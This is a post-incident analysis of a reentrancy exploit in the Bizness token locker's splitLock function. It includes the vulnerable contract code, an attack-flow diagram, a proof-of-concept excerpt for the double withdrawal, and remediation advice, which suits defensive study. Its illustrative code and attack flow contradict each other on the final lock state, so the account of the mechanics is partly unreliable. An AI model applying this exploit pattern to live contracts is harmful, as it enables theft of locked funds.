# Bizness — splitLock Reentrancy Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-12-27 |
| **Protocol** | Bizness Token Locker |
| **Chain** | Base |
| **Loss** | ~15,700 USD |
| **Attacker** | [0x3cc1edd8](https://basescan.org/address/0x3cc1edd8a25c912fcb51d7e61893e737c48cd98d) |
| **Attack Tx** | [0x984cb29c](https://basescan.org/tx/0x984cb29cdb4e92e5899e9c94768f8a34047d0e1074f9c4109364e3682e488873) |
| **Vulnerable Contract** | [0xd6a7cfa8](https://basescan.org/address/0xd6a7cfa86a41b8f40b8dfeb987582a479eb10693) |
| **Root Cause** | Reentrancy allowed in LOCKER's `splitLock()` — the original lock becomes empty during the split, enabling double withdrawal |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-12/Bizness_exp.sol) |

---
## 1. Vulnerability Overview

The `splitLock()` function of the Bizness token LOCKER contract was designed to split one lock into two. However, reentrancy was permitted during the split process, allowing a new split lock to be created after the original lock's tokens had already been withdrawn. The attacker acquired lock transfer permissions via `transferLock`, then re-entered during the `splitLock()` call to double-withdraw the original lock balance.

## 2. Vulnerable Code Analysis

```solidity
// ❌ LOCKER's splitLock: reentrancy vulnerable
contract Locker {
    struct Lock {
        address token;
        uint256 amount;
        uint256 unlockDate;
        address owner;
    }

    mapping(uint256 => Lock) public locks;

    function splitLock(uint256 lockId, uint256 newAmount, uint256 newUnlockDate)
        external payable returns (uint256 newLockId)
    {
        Lock storage lock = locks[lockId];
        require(msg.sender == lock.owner);

        // ❌ No nonReentrant guard
        // ❌ External callback can occur without state update before split
        lock.amount -= newAmount;  // Reduce original

        // ❌ Reentrancy allowed during token transfer
        IERC20(lock.token).transfer(address(this), /* fee */);

        // Create new lock
        newLockId = createLock(lock.token, newAmount, newUnlockDate, msg.sender);
        // ❌ If reentered at this point, original lock.amount = 0 but new lock is created
    }
}

// ✅ Fix:
// modifier nonReentrant() { ... }
// Apply nonReentrant to splitLock() function
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: Locker.sol
    function splitLock(uint256 _id, uint256 _newAmount, uint256 _newUnlockTime) external payable whenNotPaused returns (uint256 _splitId) {  // ❌ Vulnerability
        Lock storage _lock = locks[_id];
        require(!_lock.withdrawn, "Locker: lock already withdrawn");
        require(_newUnlockTime >= _lock.unlockTime, "Locker: new unlock time must be greater than or equal to the current lock time");
        require(_newAmount > 0 && _newAmount < _lock.amount, "Locker: invalid new amount");
        require(!_isNFT(_lock.token), "Locker: NFTs cannot be split");
        address[] memory _whitelist = new address[](2);
        _whitelist[0] = _lock.token;
        _whitelist[1] = _lock.beneficiary;
        _feeHandler(_whitelist);
        _lock.amount -= _newAmount;
        _splitId = lockId;
        ++lockId;
        locks[_splitId] = Lock({
            token: _lock.token,
            tokenId: 0,
            beneficiary: _lock.beneficiary,
            amount: _newAmount,
            unlockTime: _newUnlockTime,
            withdrawn: false
        });
        emit LockSplit(_id, _splitId);
    }
```

## 3. Attack Flow

```
Attacker
  │
  ├─[Setup]─▶ ILocker(LOCKER).transferLock(lockId, address(this))
  │           → Lock ownership transferred to attacker
  │
  ├─[1]─▶ locker.splitLock{value: 0.011 ether}(lockId, lockBefore.amount - 1, unlockDate)
  │         └─ Split begins: original lock amount decremented
  │
  ├─[2]─▶ Reentrancy occurs (callback during fee transfer):
  │         └─ withdrawLock(splitId) called
  │             ❌ Original lock is empty but new lock has been created
  │             → Double withdrawal
  │
  ├─[3]─▶ splitLock completes: new lock (lockBefore.amount - 1) created
  │         Original lock has only 1 token remaining
  │
  └─[4]─▶ Final: attacker holds original + split = 2x tokens
             ~15,700 USD stolen
```

## 4. PoC Code

```solidity
contract Bizness_exp {
    function testExploit() public balanceLog {
        ILocker locker = ILocker(LOCKER);
        Lock memory lockBefore = locker.locks(lockId);

        // ❌ Reentrancy during splitLock call
        uint256 newSplitId = locker.splitLock{value: 0.011 ether}(
            lockId,
            lockBefore.amount - 1,
            1735353747  // unlockDate
        );
        // Result:
        // - Original lock: empty (already withdrawn)
        // - New lock: holds lockBefore.amount - 1 tokens
        // - Contract balance: increased by lockBefore.amount tokens
    }

    // Call withdrawLock in reentrancy callback
    function withdrawLock(uint256 _splitId) public {
        ILocker(LOCKER).withdrawLock(_splitId);
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack |
| **Attack Vector** | Callback reentrancy during splitLock + double withdrawal |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **DASP** | Reentrancy |
| **Severity** | High |

## 6. Remediation Recommendations

1. **Apply nonReentrant**: Add reentrancy protection to all withdrawal-related functions including `splitLock` and `withdrawLock`
2. **Checks-Effects-Interactions**: Transfer tokens only after state updates
3. **Pre-split Validation**: Verify that the split amount is within the original lock amount
4. **Lock State Atomicity**: Ensure split operations complete atomically within a single transaction

## 7. Lessons Learned

- Compound operation functions such as `splitLock()` in lock contracts are particularly vulnerable to reentrancy.
- When ownership transfer via `transferLock` is possible, an attacker can directly target any lock of their choosing.
- Contracts that hold tokens long-term must use OpenZeppelin's `ReentrancyGuard` without exception.